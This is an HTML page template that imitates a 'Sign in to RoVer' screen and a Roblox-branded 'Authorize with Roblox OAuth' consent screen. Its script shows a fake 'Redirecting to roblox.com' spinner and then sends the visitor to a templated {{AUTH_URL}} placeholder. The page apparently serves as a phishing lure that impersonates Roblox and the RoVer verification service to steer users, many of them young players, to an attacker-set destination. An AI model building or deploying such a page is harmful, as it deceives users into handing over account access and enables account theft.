<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RoVer</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      min-height: 100%;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      background: #1c1c1c;
      color: #fff;
      display: flex;
      flex-direction: column;
    }

    header {
      background: #e91e8c;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 24px;
      position: sticky;
      top: 0;
      z-index: 10;
      flex-shrink: 0;
    }
    .menu { font-size: 26px; }
    .logo { display: flex; align-items: center; gap: 10px; font-size: 22px; font-weight: 700; }
    .logo svg { width: 30px; height: 30px; fill: white; }
    .spacer { width: 26px; }

    /* SCREENS */
    .screen { display: none; flex: 1; flex-direction: column; }
    .screen.active { display: flex; }

    /* ── SCREEN 0: Sign in to RoVer ── */
    #s0 { align-items: center; justify-content: center; padding: 48px 20px; }
    .card {
      background: #000;
      border-radius: 8px;
      padding: 56px 72px;
      text-align: center;
      max-width: 520px;
      width: 100%;
    }
    .card h1 { font-size: 30px; font-weight: 700; margin-bottom: 14px; }
    .card p { font-size: 14px; color: #bbb; margin-bottom: 32px; }
    .btn-pink {
      display: inline-block;
      background: #e91e8c;
      color: white;
      border: none;
      padding: 13px 40px;
      border-radius: 999px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      text-decoration: none;
    }
    .btn-pink:hover { background: #c2185b; }

    /* ── SCREEN 1: Authorize with Roblox OAuth ── */
    #s1 { background: #111; }
    .roblox-bar {
      background: #111;
      padding: 16px 24px;
      border-bottom: 1px solid #2a2a2a;
    }
    .roblox-wordmark {
      font-size: 22px;
      font-weight: 900;
      letter-spacing: -1px;
      color: white;
      font-family: Arial Black, sans-serif;
    }
    .auth-body {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 40px 20px;
      text-align: center;
    }
    .auth-body h2 { font-size: 22px; font-weight: 600; margin-bottom: 24px; }
    .divider { width: 100%; max-width: 440px; border: none; border-top: 1px solid #333; margin-bottom: 36px; }
    .rover-icon svg { width: 72px; height: 72px; fill: #e91e8c; }
    .rover-label { font-size: 16px; margin-top: 10px; margin-bottom: 32px; color: #ddd; }
    .btn-continue {
      display: block;
      width: 100%;
      max-width: 440px;
      padding: 14px;
      background: #f0f0f0;
      color: #111;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 16px;
      text-align: center;
    }
    .btn-continue:hover { background: #ddd; }
    .or-divider { font-size: 13px; color: #888; margin-bottom: 16px; }
    .btn-return {
      display: block;
      width: 100%;
      max-width: 440px;
      padding: 14px;
      background: transparent;
      color: #ccc;
      border: 1px solid #444;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      text-align: center;
    }
    .btn-return:hover { background: #222; }

    /* ── SCREEN 2: Redirecting ── */
    #s2 { background: #111; }
    .redirect-body {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 40px 20px;
      text-align: center;
    }
    .redirect-body h2 { font-size: 22px; font-weight: 600; margin-bottom: 28px; }
    .divider2 { width: 100%; max-width: 600px; border: none; border-top: 1px solid #333; margin-bottom: 36px; }
    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #333;
      border-top-color: #4f9cf9;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 24px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .redirect-note { font-size: 13px; color: #888; }
    .redirect-note a { color: #4f9cf9; text-decoration: none; }

    /* ── RESPONSIVE ── */
    @media (max-width: 600px) {
      .card { padding: 36px 20px; }
      .card h1 { font-size: 24px; }
      .btn-continue, .btn-return { max-width: 100%; }
    }
    @media (max-width: 900px) and (orientation: landscape) {
      #s0 { padding: 24px 20px; }
      .card { padding: 32px 40px; }
    }
  </style>
</head>
<body>

  <header>
    <span class="menu">&#9776;</span>
    <div class="logo">
      <svg viewBox="0 0 100 100"><rect x="10" y="10" width="35" height="35" rx="4"/><rect x="55" y="10" width="35" height="35" rx="4"/><rect x="10" y="55" width="35" height="35" rx="4"/><rect x="55" y="55" width="35" height="35" rx="4"/></svg>
      RoVer
    </div>
    <span class="spacer"></span>
  </header>

  <!-- SCREEN 0: Sign in -->
  <div id="s0" class="screen active">
    <div class="card">
      <h1>Sign in to RoVer</h1>
      <p>You must be 13 years of age or older to continue.</p>
      <button class="btn-pink" onclick="showScreen('s1')">Log in with Roblox</button>
    </div>
  </div>

  <!-- SCREEN 1: Authorize -->
  <div id="s1" class="screen">
    <div class="roblox-bar">
      <span class="roblox-wordmark">R&#11835;BLOX</span>
    </div>
    <div class="auth-body">
      <h2>Authorize with Roblox OAuth</h2>
      <hr class="divider">
      <div class="rover-icon">
        <svg viewBox="0 0 100 100"><rect x="10" y="10" width="35" height="35" rx="4"/><rect x="55" y="10" width="35" height="35" rx="4"/><rect x="10" y="55" width="35" height="35" rx="4"/><rect x="55" y="55" width="35" height="35" rx="4"/></svg>
      </div>
      <div class="rover-label">RoVer</div>
      <button class="btn-continue" onclick="startRedirect()">Continue</button>
      <div class="or-divider">or</div>
      <button class="btn-return" onclick="showScreen('s0')">Return to RoVer</button>
    </div>
  </div>

  <!-- SCREEN 2: Redirecting -->
  <div id="s2" class="screen">
    <div class="roblox-bar">
      <span class="roblox-wordmark">R&#11835;BLOX</span>
    </div>
    <div class="redirect-body">
      <h2>Redirecting to roblox.com</h2>
      <hr class="divider2">
      <div class="spinner"></div>
      <p class="redirect-note">If you are not redirected back in a few seconds, <a href="{{AUTH_URL}}">cancel</a> and try again.</p>
    </div>
  </div>

  <script>
    const FINAL_URL = '{{AUTH_URL}}';

    function showScreen(id) {
      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
      document.getElementById(id).classList.add('active');
    }

    function startRedirect() {
      showScreen('s2');
      setTimeout(() => {
        window.location.href = FINAL_URL;
      }, 1000);
    }
  </script>

</body>
</html>
